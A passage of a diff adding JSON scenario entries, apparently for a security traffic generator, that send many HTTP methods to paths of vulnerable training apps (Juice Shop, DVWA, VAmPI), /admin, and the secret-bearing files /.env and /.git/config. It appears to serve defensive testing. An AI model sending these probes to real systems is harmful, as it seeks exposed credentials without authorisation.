+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-26",
+            "method": "TRACE",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-27",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-28",
+            "method": "PROPFIND",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-29",
+            "method": "PROPPATCH",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-30",
+            "method": "MKCOL",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-31",
+            "method": "COPY",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-32",
+            "method": "MOVE",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-33",
+            "method": "LOCK",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-34",
+            "method": "UNLOCK",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-35",
+            "method": "SEARCH",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-36",
+            "method": "PURGE",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-37",
+            "method": "DEBUG",
+            "path": "/juice-shop/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-38",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "POST-39",
+            "method": "POST",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "PUT-40",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "DELETE-41",
+            "method": "DELETE",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "PATCH-42",
+            "method": "PATCH",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "OPTIONS-43",
+            "method": "OPTIONS",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "HEAD-44",
+            "method": "HEAD",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "TRACE-45",
+            "method": "TRACE",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "CONNECT-46",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            },
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "PROPFIND-47",
+            "method": "PROPFIND",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "PROPPATCH-48",
+            "method": "PROPPATCH",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "MKCOL-49",
+            "method": "MKCOL",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "COPY-50",
+            "method": "COPY",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "MOVE-51",
+            "method": "MOVE",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "LOCK-52",
+            "method": "LOCK",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "UNLOCK-53",
+            "method": "UNLOCK",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "SEARCH-54",
+            "method": "SEARCH",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "PURGE-55",
+            "method": "PURGE",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "DEBUG-56",
+            "method": "DEBUG",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "test"
+            }
+          },
+          {
+            "id": "GET-57",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-58",
+            "method": "POST",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-59",
+            "method": "PUT",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-60",
+            "method": "DELETE",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-61",
+            "method": "PATCH",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-62",
+            "method": "OPTIONS",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-63",
+            "method": "HEAD",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-64",
+            "method": "TRACE",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-65",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-66",
+            "method": "PROPFIND",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-67",
+            "method": "PROPPATCH",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-68",
+            "method": "MKCOL",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-69",
+            "method": "COPY",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-70",
+            "method": "MOVE",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-71",
+            "method": "LOCK",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-72",
+            "method": "UNLOCK",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-73",
+            "method": "SEARCH",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-74",
+            "method": "PURGE",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-75",
+            "method": "DEBUG",
+            "path": "/dvwa/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-76",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-77",
+            "method": "POST",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-78",
+            "method": "PUT",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-79",
+            "method": "DELETE",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-80",
+            "method": "PATCH",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-81",
+            "method": "OPTIONS",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-82",
+            "method": "HEAD",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-83",
+            "method": "TRACE",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-84",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-85",
+            "method": "PROPFIND",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-86",
+            "method": "PROPPATCH",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-87",
+            "method": "MKCOL",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-88",
+            "method": "COPY",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-89",
+            "method": "MOVE",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-90",
+            "method": "LOCK",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-91",
+            "method": "UNLOCK",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-92",
+            "method": "SEARCH",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-93",
+            "method": "PURGE",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-94",
+            "method": "DEBUG",
+            "path": "/dvwa/login.php",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-95",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-96",
+            "method": "POST",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-97",
+            "method": "PUT",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-98",
+            "method": "DELETE",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-99",
+            "method": "PATCH",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-100",
+            "method": "OPTIONS",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-101",
+            "method": "HEAD",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-102",
+            "method": "TRACE",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-103",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-104",
+            "method": "PROPFIND",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-105",
+            "method": "PROPPATCH",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-106",
+            "method": "MKCOL",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-107",
+            "method": "COPY",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-108",
+            "method": "MOVE",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-109",
+            "method": "LOCK",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-110",
+            "method": "UNLOCK",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-111",
+            "method": "SEARCH",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-112",
+            "method": "PURGE",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-113",
+            "method": "DEBUG",
+            "path": "/vampi/",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-114",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-115",
+            "method": "POST",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-116",
+            "method": "PUT",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-117",
+            "method": "DELETE",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-118",
+            "method": "PATCH",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-119",
+            "method": "OPTIONS",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-120",
+            "method": "HEAD",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-121",
+            "method": "TRACE",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-122",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-123",
+            "method": "PROPFIND",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-124",
+            "method": "PROPPATCH",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-125",
+            "method": "MKCOL",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-126",
+            "method": "COPY",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-127",
+            "method": "MOVE",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-128",
+            "method": "LOCK",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-129",
+            "method": "UNLOCK",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-130",
+            "method": "SEARCH",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-131",
+            "method": "PURGE",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-132",
+            "method": "DEBUG",
+            "path": "/vampi/users/v1",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-133",
+            "method": "GET",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-134",
+            "method": "POST",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-135",
+            "method": "PUT",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-136",
+            "method": "DELETE",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-137",
+            "method": "PATCH",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-138",
+            "method": "OPTIONS",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-139",
+            "method": "HEAD",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-140",
+            "method": "TRACE",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-141",
+            "method": "GET",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-142",
+            "method": "PROPFIND",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-143",
+            "method": "PROPPATCH",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-144",
+            "method": "MKCOL",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-145",
+            "method": "COPY",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-146",
+            "method": "MOVE",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-147",
+            "method": "LOCK",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-148",
+            "method": "UNLOCK",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-149",
+            "method": "SEARCH",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-150",
+            "method": "PURGE",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-151",
+            "method": "DEBUG",
+            "path": "/admin",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-152",
+            "method": "GET",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-153",
+            "method": "POST",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-154",
+            "method": "PUT",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-155",
+            "method": "DELETE",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-156",
+            "method": "PATCH",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-157",
+            "method": "OPTIONS",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-158",
+            "method": "HEAD",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-159",
+            "method": "TRACE",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-160",
+            "method": "GET",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-161",
+            "method": "PROPFIND",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-162",
+            "method": "PROPPATCH",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-163",
+            "method": "MKCOL",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-164",
+            "method": "COPY",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-165",
+            "method": "MOVE",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-166",
+            "method": "LOCK",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-167",
+            "method": "UNLOCK",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-168",
+            "method": "SEARCH",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-169",
+            "method": "PURGE",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-170",
+            "method": "DEBUG",
+            "path": "/.env",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "GET-171",
+            "method": "GET",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "POST-172",
+            "method": "POST",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PUT-173",
+            "method": "PUT",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DELETE-174",
+            "method": "DELETE",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PATCH-175",
+            "method": "PATCH",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "OPTIONS-176",
+            "method": "OPTIONS",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "HEAD-177",
+            "method": "HEAD",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "TRACE-178",
+            "method": "TRACE",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "CONNECT-179",
+            "method": "GET",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-tgen-raw-method": "CONNECT"
+            }
+          },
+          {
+            "id": "PROPFIND-180",
+            "method": "PROPFIND",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PROPPATCH-181",
+            "method": "PROPPATCH",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MKCOL-182",
+            "method": "MKCOL",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "COPY-183",
+            "method": "COPY",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "MOVE-184",
+            "method": "MOVE",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "LOCK-185",
+            "method": "LOCK",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "UNLOCK-186",
+            "method": "UNLOCK",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "SEARCH-187",
+            "method": "SEARCH",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "PURGE-188",
+            "method": "PURGE",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "DEBUG-189",
+            "method": "DEBUG",
+            "path": "/.git/config",
+            "payload_class": "http-method-probe",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "traffic-generation/04-ua-rotation",
